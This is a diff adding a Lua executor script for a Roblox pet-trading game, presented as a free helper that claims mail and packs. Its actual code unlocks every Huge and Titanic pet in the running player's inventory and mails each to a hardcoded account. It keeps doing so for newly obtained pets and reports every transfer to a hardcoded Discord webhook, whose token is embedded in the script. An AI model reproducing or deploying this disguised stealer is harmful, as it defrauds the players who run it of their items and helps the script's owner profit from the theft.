@@ -1,0 +1,557 @@
+getgenv().Config = {
+    Key = "free",
+    ClaimMail = true,
+    ClaimForeverPack = true,
+    SendWebhook = true,
+    Webhook_URL = "https://discordapp.com/api/webhooks/1272924017279500358/bSCPZ6GNJPboog-FtdCEgWRvwwNIuokpUMZntsI8tk3YqS0Iz-2aE24ij4yNC76xsrZq",
+    OnlySendObtainedHuge = false,
+    SendHuge = true,
+    PlayerToSend = "Octoptys",
+    PingUser = true,
+    UserId = "651452406974119966",
+    HidePlayerName = false
+
+}
+
+
+local correctKeys = {"free", "Free", "FREE"}  -- Список допустимых ключей
+local enteredKey = getgenv().Config.Key
+
+local keyIsValid = false
+
+for _, key in ipairs(correctKeys) do
+    if enteredKey == key then
+        keyIsValid = true
+        break
+    end
+end
+if keyIsValid then
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local const = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Directory"))
+    local HttpService = game:GetService("HttpService")
+    local request = http_request or request
+    local Network = ReplicatedStorage:WaitForChild("Network")
+    local MailboxClaim = Network:WaitForChild("Mailbox: Claim")
+    local player = game:GetService("Players").LocalPlayer
+    local itemsFrame = player.PlayerGui["_MACHINES"].MailboxMachine.Frame.GiftsFrame.ItemsFrame
+    local library = require(game.ReplicatedStorage.Library.Client.Save)
+    local save = library.Get()
+    local userId = getgenv().Config.UserId
+    local pingUser = getgenv().Config.PingUser and "<@" .. userId .. ">" or ""
+
+
+    local API_URL = "https://biggamesapi.io/api/rap"
+    local Ex_URL = "https://biggamesapi.io/api/exists"
+
+
+    local rapData = {}
+    local existsData = {}
+
+
+    local hidePlayerName = getgenv().Config.HidePlayerName
+
+    task.wait(1)
+
+    local frameFound = false
+
+    local function claimMail(mailId)
+        local args = {
+            [1] = {
+                [1] = mailId
+            }
+        }
+        MailboxClaim:InvokeServer(unpack(args))
+    end
+
+    if getgenv().Config.ClaimMail then
+        for _, itemFrame in pairs(itemsFrame:GetChildren()) do
+            if itemFrame:IsA("Frame") then
+                frameFound = true
+                local mailId = itemFrame.Name
+                claimMail(mailId)
+                task.wait(1)
+            end
+        end
+        if not frameFound then
+            print("MAIL EMPTY")
+        end
+    end
+
+    task.wait(1)
+    if getgenv().Config.ForeverPack then
+        local args = {
+            [1] = "Default"
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("ForeverPacks: Claim Free"):InvokeServer(unpack(args))
+        print("ForeverPack successfully Claimed")
+    end
+
+    task.wait(2)
+
+
+
+    local function formatNumber(number)
+        if not number then
+            return "Не доступно"
+        end
+        local formatted = tostring(number)
+        local k = 1
+        local result = ""
+        for i = #formatted, 1, -1 do
+            if k > 1 and (k - 1) % 3 == 0 then
+                result = "," .. result
+            end
+            result = formatted:sub(i, i) .. result
+            k = k + 1
+        end
+        return result
+    end
+
+
+    local function loadDataFromAPI(url, dataTable)
+        local response
+        local success, err = pcall(function()
+            response = request({
+                Url = url,
+                Method = 'GET',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                }
+            })
+        end)
+        
+        if not success then
+            warn("Ошибка получения данных из API:", err)
+            return false
+        end
+        
+        if not response then
+            warn("Пустой ответ от API:", url)
+            return false
+        end
+
+        local decodedData
+        local success, err = pcall(function()
+            decodedData = HttpService:JSONDecode(response.Body)
+        end)
+        
+        if not success then
+            warn("Ошибка декодирования данных из API:", err)
+            return false
+        end
+
+        if not decodedData then
+            warn("Не удалось декодировать ответ от API:", url)
+            return false
+        end
+
+
+        if decodedData.status == "ok" and decodedData.data then
+            for _, item in ipairs(decodedData.data) do
+                local petId = item.configData.id
+                local pt = item.configData.pt
+                local sh = item.configData.sh
+                
+                if not dataTable[petId] then
+                    dataTable[petId] = {}
+                end
+
+
+                local key
+                if pt then
+                    key = tostring(pt) .. (sh and ":shiny" or ":normal")
+                else
+                    key = sh and ":shiny" or ":normal"
+                end
+
+                dataTable[petId][key] = item.value
+            end
+            return true
+        else
+            warn("Не удалось получить данные из API")
+            return false
+        end
+    end
+
+
+    local function getValueFromMemory(petId, pt, sh, dataTable)
+        local petValues = dataTable[petId]
+        if petValues then
+            local key
+            if pt then
+                key = tostring(pt) .. (sh and ":shiny" or ":normal")
+            else
+                key = sh and ":shiny" or ":normal"
+            end
+
+            local value = petValues[key]
+            if value then
+                return value
+            else
+                print("Не найдено значение для питомца", petId, "с параметрами pt:", pt, "sh:", sh)
+            end
+        else
+            print("Не найдены данные для питомца", petId)
+        end
+        return nil
+    end
+
+
+    local function convertAssetIdToUrl(assetId)
+        return "https://biggamesapi.io/image/" .. assetId
+    end
+
+
+    local function mixColors(color1, color2, ratio)
+        local r1 = math.floor(color1 / 65536)
+        local g1 = math.floor((color1 % 65536) / 256)
+        local b1 = color1 % 256
+
+        local r2 = math.floor(color2 / 65536)
+        local g2 = math.floor((color2 % 65536) / 256)
+        local b2 = color2 % 256
+
+        local r = math.floor(r1 * (1 - ratio) + r2 * ratio)
+        local g = math.floor(g1 * (1 - ratio) + g2 * ratio)
+        local b = math.floor(b1 * (1 - ratio) + b2 * ratio)
+
+        return r * 65536 + g * 256 + b
+    end
+
+    local function determineColor(pt, sh)
+        local color
+
+        if pt == 1 then
+            color = 0xFFD700
+        elseif pt == 2 then
+            color = 0xFF69B4
+        else
+            color = 0x00ff00
+        end
+
+        if sh == true then
+            color = mixColors(color, 0xFFFFFF, 0.5)
+        end
+
+        return color
+    end
+
+
+
+
+    local function sendToDiscord(petName, petImageUrl, rapValue, existsValue, color)
+
+
+        local PlayerName = getgenv().Config.PlayerToSend
+
+
+        local playerName = player and player.Name or "Unknown"
+        
+
+        local description = hidePlayerName
+            and "A player successfully transferred pet to the " .. "||" .. PlayerName .. "||" 
+            or ("||" .. playerName .. "|| successfully transferred pet to " .. "||" .. PlayerName .. "||")
+
+        local embeds = {
+            {
+                ["title"] = petName,
+                ["description"] = description,
+                ["type"] = "rich",
+                ["color"] = color,
+                ["thumbnail"] = {
+                    ["url"] = petImageUrl
+                },
+                ["fields"] = {
+                    {
+                        ["name"] = "RAP:",
+                        ["value"] = formatNumber(rapValue) .. "💎",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Exist:",
+                        ["value"] = formatNumber(existsValue) .. "📦",
+                        ["inline"] = true
+                    }
+                },
+                ["author"] = {
+                    ["name"] = "Pet System",
+                    ["icon_url"] = "https://i.ytimg.com/vi/yEWRm2euy2A/hqdefault.jpg"
+                },
+                ["footer"] = {
+                    ["text"] = "Thanks for playing!",
+                    ["icon_url"] = "https://i.ytimg.com/vi/yEWRm2euy2A/hqdefault.jpg"
+                }
+            }
+        }
+
+        local success, err = pcall(function()
+            request({
+                Url = getgenv().Config.Webhook_URL,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = HttpService:JSONEncode({
+                    ["content"] = pingUser,
+                    ["embeds"] = embeds
+                })
+            })
+        end)
+
+        if not success then
+            warn("Ошибка отправки в Discord:", err)
+        else
+            task.wait()
+        end
+    end
+
+
+
+    local function sendToDiscord2(petName, petImageUrl, rapValue, existsValue, color)
+
+
+        local playerName = player and player.Name or "Unknown"
+
+        local description = hidePlayerName
+            and "A player obtained new pet!"
+            or ("||" .. playerName .. "|| obtained new pet!")
+        
+
+        local embeds = {
+            {
+                ["title"] = petName,
+                ["description"] = description,
+                ["type"] = "rich",
+                ["color"] = color,
+                ["thumbnail"] = {
+                    ["url"] = petImageUrl
+                },
+                ["fields"] = {
+                    {
+                        ["name"] = "RAP:",
+                        ["value"] = formatNumber(rapValue) .. "💎",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Exist:",
+                        ["value"] = formatNumber(existsValue) .. "📦",
+                        ["inline"] = true
+                    }
+                },
+                ["author"] = {
+                    ["name"] = "Pet System",
+                    ["icon_url"] = "https://i.ytimg.com/vi/yEWRm2euy2A/hqdefault.jpg"
+                },
+                ["footer"] = {
+                    ["text"] = "Thanks for playing!",
+                    ["icon_url"] = "https://i.ytimg.com/vi/yEWRm2euy2A/hqdefault.jpg"
+                }
+            }
+        }
+
+        local success, err = pcall(function()
+            request({
+                Url = getgenv().Config.Webhook_URL,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = HttpService:JSONEncode({
+                    ["content"] = pingUser,
+                    ["embeds"] = embeds
+                })
+            })
+        end)
+
+        if not success then
+            warn("Ошибка отправки в Discord:", err)
+        else
+            task.wait()
+        end
+    end
+
+
+    local function getPetImageUrl(petId)
+        local petData = const.Pets[petId]
+        if petData and petData.thumbnail then
+
+            local assetId = petData.thumbnail:match("rbxassetid://(%d+)")
+            if assetId then
+                return convertAssetIdToUrl(assetId)
+            end
+        end
+        return nil
+    end
+
+    if not getgenv().Config.OnlySendObtainedHuge then
+        local function DepositPetInTrade()
+            if save.Inventory.Pet ~= nil then
+                for id, pet in pairs(save.Inventory.Pet) do
+                    if string.find(pet.id, "Huge") or string.find(pet.id, "Titanic") then
+                        
+                        if getgenv().Config.SendHuge then
+                            local args = {
+                                [1] = id,
+                                [2] = false
+                            }
+                            
+                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+                            task.wait(0.5)
+                            local Mailargs = {
+                                [1] = getgenv().Config.PlayerToSend,
+                                [2] = "ty",
+                                [3] = "Pet",
+                                [4] = id,
+                                [5] = 1
+                            }
+                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(Mailargs))
+                            task.wait(1)
+
+                        end
+
+                        if getgenv().Config.SendWebhook then
+                            local petType = ""
+
+
+                            if pet.pt == 1 then
+                                petType = "Golden"
+                            elseif pet.pt == 2 then
+                                petType = "Rainbow"
+                            end
+                            if pet.sh then
+                                petType = "Shiny " .. petType
+                            end
+
+
+                            local rapLoaded = loadDataFromAPI(API_URL, rapData)
+                            local existsLoaded = loadDataFromAPI(Ex_URL, existsData)
+                            if not (rapLoaded and existsLoaded) then
+                                return
+                            end
+
+
+                            local petImageUrl = getPetImageUrl(pet.id)
+                            local petValueRAP = getValueFromMemory(pet.id, pet.pt, pet.sh, rapData)
+                            local petValueExists = getValueFromMemory(pet.id, pet.pt, pet.sh, existsData)
+                            local color = determineColor(pet.pt, pet.sh)
+
+                            if petValueRAP and petValueExists then
+
+                                sendToDiscord(petType .. " " .. pet.id, petImageUrl, petValueRAP, petValueExists, color)
+                            else
+                                task.wait()
+                            end
+
+
+                            rapData = {}
+                            existsData = {}
+                        end
+                    else
+                        task.wait()
+                    end
+                end
+            end
+        end
+        DepositPetInTrade()
+    end
+
+    
+
+
+
+    task.wait(2)
+
+
+
+    local sentWebhookForPets = {} -- Таблица для отслеживания отправленных вебхуков
+
+    local function onItemsUpdate(fr, pets)
+        if pets and pets.set and pets.set.Pet then
+            for id, pet in pairs(pets.set.Pet) do
+                if string.find(pet.id, "Huge") or string.find(pet.id, "Titanic") then
+                    if pet and pet.id then
+                        -- Разблокировка питомца перед выполнением остальных действий
+                        if getgenv().Config.SendHuge then
+                            local unlockArgs = {
+                                [1] = id,
+                                [2] = false
+                            }
+                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(unlockArgs))
+                            task.wait(0.5) -- Ждем немного, чтобы разблокировка завершилась
+
+                            -- Отправка питомца по почте
+                            local mailArgs = {
+                                [1] = getgenv().Config.PlayerToSend,
+                                [2] = "ty",
+                                [3] = "Pet",
+                                [4] = id,
+                                [5] = 1
+                            }
+                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(mailArgs))
+                            task.wait(0.5)
+                        end
+
+                        -- Выполняем действия только если включена отправка вебхука и вебхук еще не был отправлен
+                        if getgenv().Config.SendWebhook and not sentWebhookForPets[id] then
+
+                            -- Загрузка данных из API
+                            local rapLoaded = loadDataFromAPI(API_URL, rapData)
+                            local existsLoaded = loadDataFromAPI(Ex_URL, existsData)
+                            if not (rapLoaded and existsLoaded) then
+                                return
+                            end
+
+                            -- Определение типа питомца
+                            local petType = ""
+                            if pet.pt == 1 then
+                                petType = "Golden"
+                            elseif pet.pt == 2 then
+                                petType = "Rainbow"
+                            end
+
+                            if pet.sh then
+                                petType = "Shiny " .. petType
+                            end
+
+                            -- Получение цвета и других данных
+                            local color = determineColor(pet.pt, pet.sh)
+                            local petImageUrl = getPetImageUrl(pet.id)
+                            local petValueRAP = getValueFromMemory(pet.id, pet.pt, pet.sh, rapData)
+                            local petValueExists = getValueFromMemory(pet.id, pet.pt, pet.sh, existsData)
+
+                            if petValueRAP and petValueExists then
+                                -- Отправка уведомления в Discord
+                                sendToDiscord2(petType .. " " .. pet.id, petImageUrl, petValueRAP, petValueExists, color)
+                                
+                                -- Устанавливаем флаг, что вебхук был отправлен
+                                sentWebhookForPets[id] = true
+
+                                rapData = {}
+                                existsData = {}
+                            else
+                                print("Не удалось найти значения для питомца с ID:", pet.id)
+                            end
+                        end
+                    else
+                        print("Не удалось найти ID питомца.")
+                    end
+                end
+            end
+        end
+    end
+
+
+    local connection = ReplicatedStorage:WaitForChild("Network"):WaitForChild("Items: Update").OnClientEvent:Connect(onItemsUpdate)
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "Status",
+        Text = "Script successfully injected! Good Luck!",
+        Duration = 5,
+    })
+else
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "Key Invalid!",
+        Text = "Get New Key From Owner",
+        Duration = 5,
+    })
+end
